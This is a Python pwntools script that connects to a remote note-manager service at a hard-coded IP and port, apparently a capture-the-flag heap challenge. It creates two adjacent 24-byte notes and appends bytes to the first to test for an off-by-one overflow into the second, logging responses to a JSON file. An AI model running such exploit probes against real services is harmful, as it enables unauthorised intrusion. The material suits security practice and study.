#!/usr/bin/env python3
from pwn import *
import json, os

context.log_level = 'error'
context.arch = 'amd64'

HOST = '212.2.250.33'
PORT = 31185
OUTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'results.json')

results = {}

io = remote(HOST, PORT, timeout=10)

banner = io.recvuntil(b'> ')
results['banner'] = banner.decode(errors='replace')

# Create note 0: size 24 (0x18), fill completely with 'A'
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'24')
io.recvuntil(b':')
io.sendline(b'A' * 24)
resp = io.recvuntil(b'> ')
results['create0'] = resp.decode(errors='replace')

# Create note 1: size 24 (0x18), fill with 'B'
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'24')
io.recvuntil(b':')
io.sendline(b'B' * 24)
resp = io.recvuntil(b'> ')
results['create1'] = resp.decode(errors='replace')

# Print note 0 before edit
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'0')
resp = io.recvuntil(b'> ')
results['print0_before'] = resp.decode(errors='replace')

# Edit note 0: try to append 1 byte 'X'
io.sendline(b'2')
io.recvuntil(b':')
io.sendline(b'0')
io.recvuntil(b':')
io.sendline(b'X')
resp = io.recvuntil(b'> ')
results['edit0_1byte'] = resp.decode(errors='replace')

# Print note 0 after edit
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'0')
resp = io.recvuntil(b'> ')
results['print0_after'] = resp.decode(errors='replace')

# Print note 1 after edit (check corruption)
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'1')
resp = io.recvuntil(b'> ')
results['print1_after'] = resp.decode(errors='replace')

# Try edit note 0 again: append another byte 'Y'
io.sendline(b'2')
io.recvuntil(b':')
io.sendline(b'0')
io.recvuntil(b':')
io.sendline(b'Y')
resp = io.recvuntil(b'> ')
results['edit0_2nd'] = resp.decode(errors='replace')

# Print note 0 after second edit
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'0')
resp = io.recvuntil(b'> ')
results['print0_after2'] = resp.decode(errors='replace')

# Print note 1 after second edit
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'1')
resp = io.recvuntil(b'> ')
results['print1_after2'] = resp.decode(errors='replace')

io.close()

with open(OUTFILE, 'w') as f:
    json.dump(results, f, indent=2)
print(f"DONE: {OUTFILE}")
